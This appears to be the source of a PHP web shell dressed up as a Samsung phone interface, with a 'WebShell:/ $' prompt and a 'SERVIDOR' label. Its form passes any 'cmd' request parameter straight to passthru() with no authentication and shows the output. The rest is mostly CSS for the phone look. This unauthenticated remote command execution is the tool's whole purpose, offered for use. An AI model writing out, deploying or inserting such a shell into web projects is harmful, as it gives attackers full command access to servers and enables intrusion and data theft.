...
<div class="nexus">
	<div class="speaker"><center><p>Samsung</p></center>
	</div>
	<div class="screen">
		...
		<ul class="phone-tabs">
			<li class="current">
				<a href="shell.php?cmd" target="iframe_a" class="getphone"><i class="icon phone">
				</i></a>
			</li>
			<li>
				<a class="getclock"><i class="icon clock"></i></a>
			</li>
			<li>
				<a class="getpeoples"><i class="icon peoples"></i></a>
			</li>
		</ul>
...
<div class="number-area">
				<p>SERVIDOR</p>
					...
					<a href="null.php" target="iframe_a" class="delete-btn">
					<i class="icon close">x</i>
					</a>			
	  <div id="bot">			
	  <div id="prompt">WebShell:/ $
      <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">  
	  <div id="caret">|
      <input type="text" name="cmd" id="cmd" class="inp" id="caret" placeholder="whoami" >
      <input class="button" type="SUBMIT" value="run">
	  </div> 
      </form> 
	   <pre class="text43"><?php passthru($_REQUEST['cmd'], $result); ?></pre>
	  </div> 
	  </div>		
	 
	  <div class="numbers-container">
<iframe class="text2" src="" name="iframe_a" height="100%" width="100%" style="border:1px solid black;" title="">
</iframe>	  
</div>
...
<br>
	...
	<ul class="main-btns">
			<li><a href="null.php" target="iframe_a" class="getphone"><i class="icon back"><</i></a></li>
			<li><a href="shell.php?cmd" target="iframe_a" class="getphone"><i class="icon home"></i></a></li>
...
top: -6px; 
left: 0px; 
background: #babbbb; width: 314px; 
height: 78px; 
border-radius: 25% / 45%; border-top: 1px solid #444;}

.nexus:after 		
{position: absolute; content: '';
 z-index: -1; bottom: -5px; left: 0px;
 background: #babbbb; width: 314px;
height: 78px;
 border-radius: 25% / 40%; 
...
width: 65px; 
height: 5px; 
background: #333;left: 50%;
 margin-left: -33px; border-radius: 0 0 6px 6px; 
...
.phone-infos 	{width: 100%; height: 17px; background: #303030;}
...
.phone-tab-contents  	{width: 100%; height: 365px; position: relative; overflow: hidden;}
.phone-tab-contents .tab 	{width: 100%; height: 365px; position: absolute; background: #3f3f3f; position: absolute; -webkit-transition:all .25s ease-in; -moz-transition:all .25s ease-in; -o-transition:all .25s ease-in; transition:all .25s ease-in;}
...
.phone-tab-contents .tab.peoples p:first-child {margin-top: 50px;}
.phone-tab-contents .tab.peoples p,
.phone-tab-contents .tab.clock p	{width: 90%; padding: 10px 5% 0; text-align: center; color: #bbb;}
.phone-tab-contents .tab.peoples p a,
.phone-tab-contents .tab.clock p a	{color: #fff;}

.main-btns 	{width: 100%; height: 0px; background: #373737;}
.main-btns li 	{list-style: none; float: left;}
...
.number-area 	{
	color: #fff; font-size: 20px; text-align: center; padding: 10px 0 20px; 
width: 100%; overflow: hidden; border-bottom: 1px solid #333; 
	margin-bottom: 10px;
...
.number-area .numbers 	
{width: 230px; float: left; padding: 0 10px; height: 1px;
background:#FFFF;

}

.number-area .delete-btn 	{float: right; margin-right: 10px; cursor: pointer;
...
.numbers-container span 	{
	width: 94px; 
	height: 30px; 
	float: left; font-size: 30px; text-indent: 22px; position: relative; padding: 15px 0; cursor: pointer;
	background:#FFFF;
	}
.numbers-container span:active 	{background: rgba(104,208,249,.4);}
...
.call-btn 	{width: 100%; text-align: center; border-top: 1px solid #333; padding-top: 10px;}
